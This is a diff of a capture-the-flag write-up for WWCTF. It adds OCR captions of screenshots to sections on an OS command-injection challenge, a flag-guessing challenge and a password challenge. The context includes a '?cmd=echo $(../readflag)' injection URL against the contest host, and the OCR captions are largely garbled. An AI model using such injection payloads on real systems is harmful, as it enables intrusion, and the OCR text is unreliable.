@@ -18,7 +18,11 @@ https://secureshell.wwctf.com/?cmd=cat
 https://secureshell.wwctf.com/?cmd=echo $(../../../../../../readflag)
 ```
 
+<!-- 这是一张图片，ocr 内容为：WWF{TH3 OS COMM4ND 1NJ3CT10N!] 应用程序 无障碍环境 目存储 代网络 舟样式编辑器 性能 非内存 调试器 控制台 HACKBAR MAX HACKBAR VARIABLES XSS WAF PASSCODE OTHER LDAP BYPASSER BASED LFI HTTPS://SECURESHELL.WWCTF.COM/?CMD-ECHO $(.///.J.J.J.J.J.JREADFLAG) -->
+
+
 ## Simpler RSA
+
 
 # MISC
 ## World Wide Flags
@@ -26,6 +30,9 @@ https://secureshell.wwctf.com/?cmd=echo $(../../../../../../readflag)
 
 http://flags.chal.wwctf.com:1337/flag
 ```
+
+<!-- 这是一张图片，ocr 内容为：FLAG GUESSING CHALLENGE! YOU CAN GUESS ALL OF THE FLAGS? 100/100 (S91159115910L TY CSN TOL PTELFIFIEN SUBMIT SELECT... (ISO CODE E.G., US) CORRECT! -->
+
 
 ## Bongcloud
 有点麻烦，暂未写
@@ -57,6 +64,8 @@ print(out)
 ```
 
 ## Forgot Password
+<!-- 这是一张图片，ocr 内容为：包含文本(C): WWFIC ? 纯文本 查找位号(L): 子文件夹(U) 纯文本 GHY 今天 今天 早于: 晚于 大小((LD) 修改日期 名称 报告 四四 摘要 文本 PREVIEW 烧卖 高高: 布尔表达式 吴:扛茗 友?)是(由默定LRA(昨英?美系PI革及?基高?欧兰ANK? NK 酒?距9?? 22 (T?LOIXD ? NK 部F?? VK PO-PE? 200000244 VK8727 WDAGUEILITYACCOUNTILLEYACCOUNTISEANC? PHIC OPERATORSLLENBEES ASE AUTHOTIZED TO PERFORE CLYPSEGEAPHIC OPEEATIONS.PY 7271H C?2D022 BUILT-IN GROUP USED BY INTEENET INFOREATION SEEVICES.9? - 220X36720092 K 1柿付92弹 NK X柳付92弹 7? ?漂X5 00?激编206X8贼-"钱? ,200000 HT? D 22.22692 WUKONG)22320133号持镜以6%,6\美软,手2网自6敬,进行,严格,严格, -->
+
 
 ```plain
 wwf{I_love_security_questions_s0_muChhhhhhhhhhhhhhhhh}
